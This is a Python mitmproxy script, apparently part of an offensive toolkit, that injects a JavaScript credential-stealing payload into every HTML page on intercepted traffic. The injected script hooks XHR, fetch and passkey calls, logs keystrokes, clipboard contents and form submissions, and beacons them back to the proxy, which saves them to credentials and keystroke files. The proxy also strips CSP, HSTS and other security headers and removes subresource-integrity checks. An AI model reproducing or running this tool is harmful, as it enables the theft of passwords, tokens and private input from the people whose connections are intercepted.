import os, json
from mitmproxy import http
from datetime import datetime

LOG_DIR = os.environ.get("LOG_DIR", os.path.join(os.path.expanduser("~"),".wizza","logs"))
CAUGHT  = f"{LOG_DIR}/credentials.txt"
KEYS    = f"{LOG_DIR}/keystrokes.txt"

# Advanced JS hook — injected into every HTML page via MitM
JS = """<script>
(function(){
  var sid=Math.random().toString(36).substr(2,9), kb={}, last={};
  var C2='/kl';

  function send(obj){
    // Primary: fetch
    try{fetch(C2,{method:'POST',body:JSON.stringify(obj)}).catch(function(){});}catch(e){}
    // Fallback: Beacon API (survives page unload)
    try{navigator.sendBeacon(C2,JSON.stringify(obj));}catch(e){}
  }

  // ── XHR hook — capture credentials sent via XMLHttpRequest ──────────────────
  var _XHRsend = XMLHttpRequest.prototype.send;
  XMLHttpRequest.prototype.send = function(body){
    try{
      if(body && typeof body==='string'){
        var lo=body.toLowerCase();
        if(lo.indexOf('pass')!==-1||lo.indexOf('pwd')!==-1||lo.indexOf('credential')!==-1){
          send({sid:sid,type:'xhr_creds',data:body.substr(0,500),url:location.href});
        }
      }
    }catch(e){}
    return _XHRsend.apply(this,arguments);
  };

  // ── fetch hook — capture credentials sent via fetch() ────────────────────────
  var _fetch = window.fetch;
  window.fetch = function(url,opts){
    try{
      if(opts && opts.body && typeof opts.body==='string'){
        var lo=opts.body.toLowerCase();
        if(lo.indexOf('pass')!==-1||lo.indexOf('pwd')!==-1||lo.indexOf('token')!==-1){
          send({sid:sid,type:'fetch_creds',data:opts.body.substr(0,500),url:url});
        }
      }
      // Basic Auth header capture (Authorization: Basic ...)
      if(opts && opts.headers){
        var auth=(opts.headers['Authorization']||opts.headers['authorization']||'');
        if(auth.indexOf('Basic ')===0){
          send({sid:sid,type:'basic_auth',Authorization:auth,url:url});
        }
      }
    }catch(e){}
    return _fetch.apply(this,arguments);
  };

  // ── SRI bypass — strip integrity attribute from all script/link tags ─────────
  document.querySelectorAll('[integrity]').forEach(function(el){
    el.removeAttribute('integrity');
  });

  // ── Clipboard capture ────────────────────────────────────────────────────────
  try{
    document.addEventListener('copy',function(){
      navigator.clipboard.readText().then(function(t){
        if(t) send({sid:sid,type:'clipboard',data:t.substr(0,500),url:location.href});
      }).catch(function(){});
    });
  }catch(e){}

  // ── WebAuthn hook — intercept FIDO2/passkey assertions ───────────────────────
  if(navigator.credentials && navigator.credentials.get){
    var _credGet=navigator.credentials.get;
    navigator.credentials.get=function(opts){
      try{ send({sid:sid,type:'webauthn_get',opts:JSON.stringify(opts),url:location.href}); }catch(e){}
      return _credGet.apply(this,arguments);
    };
  }
  if(navigator.credentials && navigator.credentials.create){
    var _credCreate=navigator.credentials.create;
    navigator.credentials.create=function(opts){
      try{ send({sid:sid,type:'webauthn_create',opts:JSON.stringify(opts),url:location.href}); }catch(e){}
      return _credCreate.apply(this,arguments);
    };
  }

  // ── Form keylog (all inputs including dynamic ones) ───────────────────────────
  document.addEventListener('input',function(e){
    var el=e.target;
    if(el.tagName==='INPUT'||el.tagName==='TEXTAREA'){
      var k=el.name||el.id||el.placeholder||el.type||'field';
      kb[k]=el.value;
    }
  },true);

  // ── Form submit capture ───────────────────────────────────────────────────────
  document.addEventListener('submit',function(e){
    var d={},els=e.target.querySelectorAll('input,textarea,select');
    for(var i=0;i<els.length;i++){
      if(els[i].name||els[i].id) d[els[i].name||els[i].id]=els[i].value;
    }
    send({sid:sid,type:'submit',data:d,url:location.href});
  },true);

  // ── MutationObserver — hook new forms injected dynamically ───────────────────
  new MutationObserver(function(muts){
    muts.forEach(function(m){
      m.addedNodes.forEach(function(n){
        if(n.querySelectorAll){
          n.querySelectorAll('input[type=password],input[name*=pass],input[name*=pwd]')
           .forEach(function(el){
            el.addEventListener('change',function(){
              send({sid:sid,type:'dynamic_pass',name:el.name||el.id,url:location.href});
            });
          });
          // Strip integrity from dynamically injected scripts
          n.querySelectorAll('[integrity]').forEach(function(el){
            el.removeAttribute('integrity');
          });
        }
      });
    });
  }).observe(document.documentElement,{childList:true,subtree:true});

  // ── beforeunload — flush keylog on page leave ─────────────────────────────────
  window.addEventListener('beforeunload',function(){
    if(Object.keys(kb).length){
      send({sid:sid,type:'keylog_final',data:kb,url:location.href});
    }
  });

  // ── Periodic keylog flush ─────────────────────────────────────────────────────
  setInterval(function(){
    if(JSON.stringify(kb)!==JSON.stringify(last)){
      send({sid:sid,type:'keylog',data:kb,url:location.href});
      last=JSON.parse(JSON.stringify(kb));
    }
  },4000);
})();
</script>"""

# Security + isolation headers to strip from all responses
_STRIP_HEADERS = [
    "Content-Security-Policy",
    "Content-Security-Policy-Report-Only",
    "X-Frame-Options",
    "Strict-Transport-Security",
    "X-XSS-Protection",
    "Cross-Origin-Opener-Policy",
    "Cross-Origin-Embedder-Policy",
    "Cross-Origin-Resource-Policy",
    "Permissions-Policy",
]

def ts():
    return datetime.now().strftime("%H:%M:%S")

def response(flow: http.HTTPFlow):
    # Strip all security/isolation headers
    for h in _STRIP_HEADERS:
        flow.response.headers.pop(h, None)
    # Inject JS into HTML pages
    ct = flow.response.headers.get("Content-Type","")
    if "text/html" in ct:
        try:
            b = flow.response.text
            if "</body>" in b:
                b = b.replace("</body>", JS + "</body>", 1)
            elif "</html>" in b:
                b = b.replace("</html>", JS + "</html>", 1)
            else:
                b += JS
            flow.response.text = b
        except Exception:
            pass

def request(flow: http.HTTPFlow):
    path = flow.request.path

    # Handle /kl keylog beacon (intercept before forwarding to target)
    if path == "/kl" and flow.request.method == "POST":
        os.makedirs(LOG_DIR, exist_ok=True)
        try:
            d = json.loads(flow.request.text)
            t = d.get("type","?")
            url = d.get("url","")
            data = d.get("data",{})
            line = f"[{ts()}] [{t}] {url}\n"
            if isinstance(data, dict):
                for k,v in data.items():
                    line += f"  {k}: {v}\n"
            else:
                line += f"  {data}\n"
            line += "\n"
            with open(KEYS,"a") as f:
                f.write(line)
            print(f"[KL] {t} — {url[:60]}", flush=True)
            if isinstance(data, dict):
                for k,v in data.items():
                    if any(x in k.lower() for x in ["pass","pwd","token","otp","auth"]):
                        print(f"  *** {k}: {v}", flush=True)
        except Exception as e:
            with open(KEYS,"a") as f:
                f.write(f"[{ts()}] parse error: {e}\n")
        flow.response = http.Response.make(204, b"", {"Access-Control-Allow-Origin": "*"})
        return

    # Capture POST to login/auth paths from the real site
    if flow.request.method == "POST":
        p = path.lower()
        if any(k in p for k in ["login","auth","signin","session","password","wp-login"]):
            os.makedirs(LOG_DIR, exist_ok=True)
            line = f"[{ts()}] POST {flow.request.host}{path}\n{flow.request.text}\n---\n"
            with open(CAUGHT,"a") as f:
                f.write(line)
            print(f"[POST] {flow.request.host}{path}", flush=True)
